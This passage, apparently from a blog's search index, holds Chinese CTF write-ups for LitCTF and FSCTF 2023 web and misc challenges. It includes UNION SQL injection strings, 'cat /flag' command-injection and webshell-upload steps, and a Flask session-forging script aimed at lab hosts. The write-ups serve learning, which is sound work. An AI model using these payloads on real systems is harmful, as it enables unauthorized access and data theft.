src="https://s2.loli.net/2024/03/07/RPZJr3A2vw5uhme.png" alt=""></p><p><strong>url/www.zip   下载文件</strong></p><p><img src="https://s2.loli.net/2024/03/07/zMZmHvISpWkjAht.png" alt=""></p><p><strong>文本打开bak文件</strong></p><p><img src="https://s2.loli.net/2024/03/07/FRqCP62IHBgNhwX.png" alt=""></p><p><strong><em>R3ady_P14yer_000ne</em>(3/?)</strong></p><blockquote><p>ps:这里 cookie 要等于 flag 的，但是我火狐没开 cookie 就跳过了好像，直接出 flag 了。0.0</p></blockquote><h3 id="PHP-是世界上最好的语言！！（wp-复现）"><a href="#PHP-是世界上最好的语言！！（wp-复现）" class="headerlink" title="PHP 是世界上最好的语言！！（wp 复现）"></a>PHP 是世界上最好的语言！！（wp 复现）</h3><p><img src="https://s2.loli.net/2024/03/07/CyIzaXEVMblSPvU.png" alt=""></p><p><strong>system(‘cat /flag’);</strong></p><p><strong>NSSCTF{28ceaa6e-ec30-4105-9f80-07148c37f547}</strong></p><blockquote><p>受不了一点</p></blockquote><h3 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h3><blockquote><p><strong>vim 在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生.swo</strong><br>URL/index.php.swp  或者  .index.php.swp      下载缓存文件</p></blockquote><p><strong>这里/.index.php.swp下载文件</strong></p><p><img src="https://s2.loli.net/2024/03/07/SsMCV15jT6zcZBe.png" alt=""></p><p><strong>紧接放入vim看看<br>口令：vim xxx.swp</strong></p><p><img src="https://s2.loli.net/2024/03/07/zXljEUDQb92vOVP.png" alt=""></p><p><strong>看不到啥东西，试试直接记事本打开看看</strong></p><p><img src="https://s2.loli.net/2024/03/07/h4BTlrwCH3Qcogn.png" alt=""></p><p><strong>有php代码，看看逻辑<br>POST一个参数cmd，cmd的值将作为系统命令执行<br>POST一个参数password，它的值进行base64编码后要强等于它的值<br>并且告诉我们值为Give_Me_Your_Flag</strong></p><p><img src="https://s2.loli.net/2024/03/07/H8PBLRNaQIdMFs4.png" alt=""></p><p><strong>构造cmd=cat /flag 得到flag</strong></p><p><strong>NSSCTF{2b0de9e7-8e90-411a-8659-4ad5ede0a36e}</strong></p><h3 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h3><p>文件上传，一句话木马</p><p><img src="https://s2.loli.net/2024/03/07/AKEOI7N9unp6f4o.png" alt=""></p><p><strong>源代码注释处发现用户名和密码</strong><br><strong>用户名：admin，密码：admin 登录</strong></p><p><img src="https://s2.loli.net/2024/03/07/B3LEDe9Y7mIktxS.png" alt=""></p><p><strong>上传一句话木马文件进去</strong></p><p><img src="https://s2.loli.net/2024/03/07/d9tFzoHTNLK3VJc.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/Q5jzbusxPDZwp94.png" alt=""></p><p><strong>进入一句话木马文件内，然后运行口令即可</strong></p><p><strong>NSSCTF{2d63a23c-8552-48d1-b029-61a727e60845} </strong></p><h3 id="彩蛋-2："><a href="#彩蛋-2：" class="headerlink" title="彩蛋 2："></a>彩蛋 2：</h3><p><img src="https://s2.loli.net/2024/03/07/jWq51eacJwDdr3T.png" alt=""></p><p><strong>进入<a href="https://github.com/ProbiusOfficial/My_pic/blob/main/demo.jpg">https://github.com/ProbiusOfficial/My_pic/blob/main/demo.jpg</a></strong></p><p><img src="https://s2.loli.net/2024/03/07/V8xyM6zOwN2dbST.png" alt=""></p><p><strong>_S0_ne3t? (2/?)</strong></p><h3 id="这是什么？SQL-！注一下-！（wp-复现）"><a href="#这是什么？SQL-！注一下-！（wp-复现）" class="headerlink" title="这是什么？SQL ！注一下 ！（wp 复现）"></a>这是什么？SQL ！注一下 ！（wp 复现）</h3><p> sql 手工注入</p><p><img src="https://s2.loli.net/2024/03/07/Z9ImsUA3qHWb4Sg.png" alt=""></p><p>Get 一个参数 id，给出源码，闭环为 6 个）</p><p>题目给出了列名是 username,password 两个，所以我们也不需要用 Order by 去爆破列名了</p><p>爆破顺序：列数 &gt; 库 &gt; 表 &gt; 列(字段)</p><p>列：column，库：schema，表：table</p><p><code>爆库:?id=1)))))) union select 1,group_concat(schema_name) from information_schema.schemata --+</code></p><p><img src="https://s2.loli.net/2024/03/07/nBcPotblrLgGCMY.png" alt=""></p><p>复现只看 flag 的库：ctftraining</p><p><code>爆表:?id=1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctftraining&#39; --+</code></p><p><img src="https://s2.loli.net/2024/03/07/5IJyrtN7u2aDkiT.png" alt=""></p><p><code>爆列：?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema = &#39;ctftraining&#39; --+</code></p><p><img src="https://s2.loli.net/2024/03/07/Q7w6esVGjJcdnOf.png" alt=""></p><p><strong>得知flag列在ctftraining库的flag表中，那么将这个列的信息抓出来看看</strong></p><p><img src="https://s2.loli.net/2024/03/07/53rMjSlQKUtveYq.png" alt=""></p><p><strong>NSSCTF{3dbfe5bc-0522-4019-aabb-0281184cbf45} </strong></p><h3 id="彩蛋-4："><a href="#彩蛋-4：" class="headerlink" title="彩蛋 4："></a>彩蛋 4：</h3><p><strong>搜索2就行</strong></p><p><img src="https://s2.loli.net/2024/03/07/8dpgRIN5hy4KnvH.png" alt=""></p><p><strong>F1rst_to_Th3_eggggggggg!</strong></p><h3 id="Http-pro-max-plus（wp-复现）"><a href="#Http-pro-max-plus（wp-复现）" class="headerlink" title="Http pro max plus（wp 复现）"></a>Http pro max plus（wp 复现）</h3><ol><li>Client-ip: 127.0.0.1 伪造本地访问</li><li>Referer: pornhub.com 伪造来源网址</li><li>User-Agent: Chrome 伪造使用的浏览器</li><li>via: Clash.win 伪造代理服务器地址</li></ol><p><img src="https://s2.loli.net/2024/03/07/WKb7rxtzkf8jJHd.png" alt=""></p><p>访问/wtfwtfwtfwtf.php</p><p><img src="https://s2.loli.net/2024/03/07/4VsljWEr9xvTXKn.png" alt=""></p><p>按钮都是无用项，在源码注释处找到 hint</p><p><img src="https://s2.loli.net/2024/03/07/96zqoNiRKejM1hD.png" alt=""></p><p><strong>访问/sejishikong.php</strong></p><p><img src="https://s2.loli.net/2024/03/07/GEqzmUBw8ldPIZ3.png" alt=""></p><p><strong>NSSCTF{82fca04a-f925-4382-bff5-4fea98e39196}</strong></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p><strong>这里展示    ； —-&gt;  %3B<br>‘cmd1;cmd2   无论前面执行是否成功后面都继续执行’</strong></p><p><img src="https://s2.loli.net/2024/03/07/npAx4zH65G2wu8K.png" alt=""></p><p><strong>NSSCTF{53ee44eb-716a-4534-90ce-3a6562e1ec91}</strong></p><blockquote><p>PS：<br>当完成某个条件后能够直接弹出 flag，说明 flag 的展示逻辑已经在服务器端实现了，完成条件会触发服务器端返回 flag 的响应。<br>而当使用 Burp Suite 抓包并发送请求时才能找到 flag，可能是因为 flag 的展示逻辑被实现在客户端的 JavaScript 代码中，而不是服务器端。在这种情况下，完成条件只是触发了客户端的 JavaScript 代码执行，然后根据返回的数据进行处理展示。因此，通过使用 Burp Suite 抓包并修改请求，可以在发送给服务器之前修改请求中的参数，使得服务器返回 flag。</p></blockquote><h3 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h3><p><img src="https://s2.loli.net/2024/03/07/6GwXYA1NhO4salk.png" alt=""></p><p><strong>Your gift just take it : /f@k3f1ag.php<br>访问<a href="http://node2.anna.nssctf.cn:28116/f@k3f1ag.php">http://node2.anna.nssctf.cn:28116/f@k3f1ag.php</a></strong></p><p><img src="https://s2.loli.net/2024/03/07/Yd7DIfBx9RbP6M2.png" alt=""></p><p><strong>全选放控制台</strong></p><p><img src="https://s2.loli.net/2024/03/07/MJsZTFml2Q3f5bq.png" alt=""></p><p><strong>NSSCTF{9b94a89d-ed34-481e-ba8c-b89f9e757a86}</strong></p><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p><strong>彩蛋分布于 我Flag呢 Follow me and hack me 作业管理系统 狠狠的注入 四个题目 中</strong></p><p><strong>LitCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_P14yer_000ne_F1rst_to_Th3_eggggggggg!}</strong></p><h3 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h3><p>   gitcommit，github 历史记录</p><p><img src="https://s2.loli.net/2024/03/07/Sgb3TZ26Rd4s9DQ.png" alt=""></p><p><strong>访问博客**</strong></p><p><img src="https://s2.loli.net/2024/03/07/FqJZN39jWiyDSBR.png" alt=""></p><p><strong>点进第一个博客</strong></p><p><img src="https://s2.loli.net/2024/03/07/g8vYePXDl2kI6N7.png" alt=""></p><p><strong>根据wp思路，前往github直接搜索ProbiusOfficial.github.io</strong></p><p><img src="https://s2.loli.net/2024/03/07/MtjH1G6CDcFhQIy.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/unGdtvXPpRr3FNc.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/7JrDEm6MLqhiT9G.png" alt=""></p><p><strong>这两个都可以，一个是原本，一个是删除flag的，但是操作记录保留了</strong></p><p><img src="https://s2.loli.net/2024/03/07/1bqt8ipGhjQLyIf.png" alt=""></p><p><strong>LitCTF{g1thub_c0mmit_1s_s0_us3ful}</strong></p><h3 id="Flag-点击就送！"><a href="#Flag-点击就送！" class="headerlink" title="Flag 点击就送！"></a>Flag 点击就送！</h3><p>伪造 session</p><p>密钥：’LitCTF’<br>工具：<strong>flask-unsign </strong></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&quot;LitCTF&quot;</span></span><br><span class="line"></span><br><span class="line">cmd_out = subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;\&#x27;name\&#x27;: \&#x27;admin\&#x27;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, SECRET_KEY])</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&#x27;session&#x27;</span> : cmd_out.decode().rstrip()&#125;</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://node5.anna.nssctf.cn:28403/flag&#x27;</span>, cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/pn9yrhMD2tN8fgo.png" alt=""></p><p><strong>NSSCTF{d971096e-fa62-43a7-be60-70acbd180d12}</strong></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="What-1s-BASE"><a href="#What-1s-BASE" class="headerlink" title="What_1s_BASE"></a>What_1s_BASE</h3><p>base64</p><p><img src="https://s2.loli.net/2024/03/07/1EsHaVCe2hPdpnk.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/qA549EdcaQBPsFN.png" alt=""></p><p><strong>LitCTF{KFC_Cr4zy_Thur3day_V_me_50}</strong></p><h3 id="Take-me-hand"><a href="#Take-me-hand" class="headerlink" title="Take me hand"></a>Take me hand</h3><p>流量分析</p><p><strong>wireshark打开，Ctrl+F 按图示设置搜索flag</strong></p><p><img src="https://s2.loli.net/2024/03/07/H5xoG6R8eXbnUBr.png" alt=""></p><p><strong>LitCTF{Give<em>y0ur_hand_to_me!!!</em>**</strong>plz<strong>**}</strong></p><h3 id="404notfound"><a href="#404notfound" class="headerlink" title="404notfound"></a>404notfound</h3><p>图片隐写</p><p><strong>010 Editor打开，搜索litctf</strong></p><p><img src="https://s2.loli.net/2024/03/07/Gb7cYEsT3IQimOp.png" alt=""></p><p><strong>LitCTF{Its_404_but_1ts_n0t_a_page}</strong></p><h3 id="喜欢我的压缩包么"><a href="#喜欢我的压缩包么" class="headerlink" title="喜欢我的压缩包么"></a>喜欢我的压缩包么</h3><p>   弱口令密码爆破</p><p><img src="https://s2.loli.net/2024/03/07/w9oNm5bYp7H8iAI.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/INv3ZOL6WCAeXuG.png" alt=""></p><p><strong>使用ziperello工具，6位数字爆破</strong></p><p><img src="https://s2.loli.net/2024/03/07/MbFRVT6EYWdHtQc.png" alt=""></p><p><strong>密码：114514   输入解压</strong></p><p><img src="https://s2.loli.net/2024/03/07/wYcx2bPInCZWKJ6.png" alt=""></p><p><strong>LitCTF{Do-u-like-my-zip-p4ck?}</strong></p><h3 id="这羽毛球怎么只有一半啊"><a href="#这羽毛球怎么只有一半啊" class="headerlink" title="这羽毛球怎么只有一半啊"></a>这羽毛球怎么只有一半啊</h3><p>图片隐写（宽高）</p><p><img src="https://s2.loli.net/2024/03/07/d73n9SPRIfCwqJA.png" alt=""></p><p><strong>05改改06 07还差点，08就够高了</strong></p><blockquote><p><strong>06 33 的 06 是宽度</strong><br><strong>07 dc 的 07 是高度</strong></p></blockquote><p><img src="https://s2.loli.net/2024/03/07/QwNT6jVxhoYfZRM.png" alt=""></p><p><strong>LitCTF{Fl4g_0fcourse!}</strong></p><blockquote><p>比赛时用工具 CRC 计算一把梭</p></blockquote><h3 id="破损的图片"><a href="#破损的图片" class="headerlink" title="破损的图片"></a>破损的图片</h3><p><a href="https://blog.csdn.net/BlueDoorZz/article/details/102797887">文件头及其十六进制</a></p><p><strong>根据题目猜测为 png 图片</strong></p><p><img src="https://s2.loli.net/2024/03/07/jMi3mIFgXnKZtbe.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/yQBWUglmJ1Dk8hn.png" alt=""></p><p><strong>补充七位文件头：89 50 4E 47 0D 0A 1A 0A<br>保存，修改后缀名为.png后打开</strong></p><p><img src="https://s2.loli.net/2024/03/07/iBHmuxk2XUbK5tq.png" alt=""></p><p><strong>LitCTF{May you, the beauty of this world, always shine.}</strong></p><h3 id="ssvvgg"><a href="#ssvvgg" class="headerlink" title="ssvvgg"></a>ssvvgg</h3><p>svg 格式，base64 转文件，steghide 爆破</p><p><img src="https://s2.loli.net/2024/03/07/v39IDEdWMOTjaG7.png" alt=""></p><p><strong>打开看到源码处有base64编码，提取出来</strong></p><p><img src="https://s2.loli.net/2024/03/07/1z5eAfVkroZgFcE.png" alt=""></p><p><strong>放入在线网站转换</strong></p><p><img src="https://s2.loli.net/2024/03/07/5n2rJGd4lYWCaMe.png" alt=""></p><p><strong>保存jpg文件，010查看</strong></p><p><img src="https://s2.loli.net/2024/03/07/wXZoLMEJWHGcYUF.png" alt=""></p><p><strong>保存jpg文件到kali，steghide本身没有爆破功能，这里使用stegseek爆破</strong></p><p><img src="https://s2.loli.net/2024/03/07/h5smzlXuqkSriN8.png" alt=""></p><p><strong>LitCTF{svg?_base642png!&amp;steghide!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSCTF 2023</title>
      <link href="/posts/FSCTF2023.html"/>
      <url>/posts/FSCTF2023.html</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Simple-Encryption"><a href="#Simple-Encryption" class="headerlink" title="Simple Encryption"></a>Simple Encryption</h3><p>伪加密 01 02 后面的 09 00 改为 00 00 即可</p><h3 id="萧河"><a href="#萧河" class="headerlink" title="萧河"></a>萧河</h3><p>补 png 头 89 50 4E 47</p><h3 id="base-套"><a href="#base-套" class="headerlink" title="base 套"></a>base 套</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_base64_decode</span>(<span class="params">data</span>):</span><br><span class="line">    decoded_data = base64.b64decode(data.encode()).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 寻找特定字词，例如 &#x27;是&#x27;</span></span><br><span class="line">    keyword = <span class="string">&#x27;是&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> keyword <span class="keyword">in</span> decoded_data:</span><br><span class="line">        index = decoded_data.index(keyword)</span><br><span class="line">        decoded_data = decoded_data[index + <span class="built_in">len</span>(keyword):]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> decoded_data:</span><br><span class="line">        <span class="keyword">return</span> decoded_data</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> recursive_base64_decode(decoded_data)</span><br><span class="line"></span><br><span class="line">base64_encoded_data = <span class="string">&quot;初始Base64数据&quot;</span>  <span class="comment"># 替换成您的初始Base64编码数据</span></span><br><span class="line"></span><br><span class="line">final_data = recursive_base64_decode(base64_encoded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的数据：&quot;</span>, final_data)</span><br></pre></td></tr></table></figure><h3 id="Ez-osint"><a href="#Ez-osint" class="headerlink" title="Ez-osint"></a>Ez-osint</h3><p><a href="https://www.bilibili.com/video/BV13K4y1s7qQ/?spm_id_from=333.999.0.0&amp;vd_source=f7e76ebc6ca15fbb8c8dc4909fad4f40">https://www.bilibili.com/video/BV13K4y1s7qQ/?spm_id_from=333.999.0.0&amp;vd_source=f7e76ebc6ca15fbb8c8dc4909fad4f40</a></p><h3 id="为什么不换换思路捏"><a href="#为什么不换换思路捏" class="headerlink" title="为什么不换换思路捏"></a>为什么不换换思路捏</h3><p><img src="https://s2.loli.net/2024/03/07/m5DEFBVXLzMNr6s.png" alt=""></p><h3 id="最终试炼-hhh"><a href="#最终试炼-hhh" class="headerlink" title="最终试炼 hhh"></a>最终试炼 hhh</h3><p>文件逆转，然后 zip 伪加密，是一个 pdf，判断是 pdf 隐写，然后用 wbStego4.3open 解密，得出 flag</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="源码！启动"><a href="#源码！启动" class="headerlink" title="源码！启动!"></a>源码！启动!</h3><p>点下网址栏再 f12 查看源码即可</p><h3 id="webshell-是啥捏"><a href="#webshell-是啥捏" class="headerlink" title="webshell 是啥捏"></a>webshell 是啥捏</h3><p>passthru()</p><p><img src="https://s2.loli.net/2024/03/07/GkgYubjmprBeNdi.png" alt=""></p><h3 id="Hello-you"><a href="#Hello-you" class="headerlink" title="Hello,you"></a>Hello,you</h3><p><img src="https://s2.loli.net/2024/03/07/oGCIzqhZjaXktEA.png" alt=""></p><h3 id="细狗-2-0"><a href="#细狗-2-0" class="headerlink" title="细狗 2.0"></a>细狗 2.0</h3><p><img src="https://s2.loli.net/2024/03/07/9imDCWykKFJvcAu.png" alt=""></p><h3 id="ez-php1"><a href="#ez-php1" class="headerlink" title="ez_php1"></a>ez_php1</h3><p><img src="https://s2.loli.net/2024/03/07/fYoNqjBITOPAuWH.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;YES I love&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/XFQCLqfmce3B9TZ.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clazz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Clazz</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;b = &amp;<span class="variable">$a</span> -&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/Zvcqt1hXWAdm3TU.png" alt=""></p><p>解密 base64 即可</p><h3 id="EZ-eval"><a href="#EZ-eval" class="headerlink" title="EZ_eval"></a>EZ_eval</h3><p>传入一句话木马后直接cat flag</p><p><img src="https://s2.loli.net/2024/03/07/o6cCJhpwdyQXKbv.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
